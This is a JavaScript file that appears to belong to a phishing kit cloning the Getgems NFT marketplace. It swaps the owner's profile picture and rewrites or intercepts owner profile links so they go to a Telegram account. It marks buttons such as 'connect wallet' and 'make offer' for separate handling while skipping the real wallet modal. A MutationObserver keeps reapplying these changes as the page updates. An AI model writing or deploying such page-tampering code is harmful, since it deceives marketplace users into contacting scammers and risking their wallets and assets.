(() => {
  const TARGET_URL = "https://t.me/xxx895";
  const OWNER_PFP = "images/owner-pfp.jpg";

  function isOwnerLink(anchor) {
    if (!anchor) return false;
    const href = (anchor.getAttribute("href") || "").toLowerCase();
    const cardText = ((anchor.closest("a,div,section,article") || anchor).textContent || "").toLowerCase();
    return href.includes("/user/") && cardText.includes("owner");
  }

  function isOwnerArea(el) {
    if (!el) return false;
    const text = (el.textContent || "").toLowerCase();
    return text.includes("owner") || text.includes("blazixx");
  }

  function patchOwnerPfp() {
    const imgs = document.querySelectorAll("img");
    for (let i = 0; i < imgs.length; i += 1) {
      const img = imgs[i];
      const src = (img.currentSrc || img.src || "").toLowerCase();
      const inOwnerArea = isOwnerArea(img.closest("a,div,section,article"));
      const fromGetgems = src.includes("i.getgems.io") || src.includes("getgems");
      if (!inOwnerArea || !fromGetgems) continue;
      img.removeAttribute("srcset");
      img.src = OWNER_PFP;
    }
  }

  function patchLinks() {
    const anchors = document.querySelectorAll("a[href]");
    for (let i = 0; i < anchors.length; i += 1) {
      const a = anchors[i];
      if (!isOwnerLink(a)) continue;
      a.href = TARGET_URL;
      a.target = "_self";
      a.rel = "noopener noreferrer";
    }
  }

  function isTopLogoLink(anchor) {
    if (!anchor) return false;
    const href = (anchor.getAttribute("href") || "").trim();
    if (href !== "/") return false;
    return !!anchor.closest("header,.PanelHeader,.PanelHeader__tg-content");
  }

  function normalize(text) {
    return (text || "").replace(/\s+/g, " ").trim().toLowerCase();
  }

  function patchInteractButtons() {
    const exact = {
      "connect wallet": true,
      "make offer": true,
      offers: true,
      stats: true,
      history: true,
      comments: true,
    };

    const nodes = document.querySelectorAll("button,a,[role='button'],[role='tab']");
    for (let i = 0; i < nodes.length; i += 1) {
      const el = nodes[i];
      const target = el.closest("button,a,[role='button'],[role='tab']") || el;
      const inWalletModal = !!el.closest(
        "w3m-modal,w3m-router,[class*='w3m'],[class*='wcm'],[class*='wui'],[data-testid^='w3m-'],[data-testid^='wcm-'],[data-testid^='wui-']",
      );
      if (inWalletModal) {
        continue;
      }
      const text = normalize(el.textContent).replace(/\(\d+\)/g, "").trim();
      const aria = `${el.getAttribute("aria-label") || ""} ${el.getAttribute("title") || ""}`;
      const classMeta = `${typeof el.className === "string" ? el.className : ""} ${el.getAttribute("data-testid") || ""}`;
      const inHeader = !!el.closest(".PanelHeader,.PanelHeader__tg-content");
      const iconOnly = text === "" && !!el.querySelector("svg");
      const isBellOrHeart = /bell|notification|heart|favorite|favourite/i.test(`${aria} ${classMeta}`);
      const isSettingsMenu =
        /menu|settings|profilemenubutton|more/i.test(`${aria} ${classMeta} ${text}`) ||
        !!el.closest(".ProfileMenuButton,[class*='ProfileMenuButton']");
      const isTabLabel = /^(offers|stats|history|comments)$/.test(text);
      if (isSettingsMenu) {
        target.classList.remove("interactBtn");
        continue;
      }
      if (exact[text] || isTabLabel || isBellOrHeart || (inHeader && iconOnly && !isSettingsMenu)) {
        target.classList.add("interactBtn");
      }
    }
  }

  function stripProfileMenuInteractClass() {
    const profileMenuNodes = document.querySelectorAll(
      ".ProfileMenuButton, [class*='ProfileMenuButton'], .ProfileMenuButton *, [class*='ProfileMenuButton'] *",
    );
    for (let i = 0; i < profileMenuNodes.length; i += 1) {
      profileMenuNodes[i].classList.remove("interactBtn");
      const clickable = profileMenuNodes[i].closest("button,a,[role='button']");
      if (clickable) clickable.classList.remove("interactBtn");
    }
  }

  document.addEventListener(
    "click",
    (event) => {
      const a = event.target instanceof Element ? event.target.closest("a[href]") : null;
      if (isOwnerLink(a)) {
        event.preventDefault();
        window.location.href = TARGET_URL;
        return;
      }
      if (isTopLogoLink(a) && event.isTrusted) {
        event.preventDefault();
        window.location.href = "https://getgems.io/";
      }
    },
    true,
  );

  function patchAll() {
    patchLinks();
    patchOwnerPfp();
    patchInteractButtons();
    stripProfileMenuInteractClass();
  }

  patchAll();
  new MutationObserver(patchAll).observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ["href", "src", "srcset"],
  });
})();
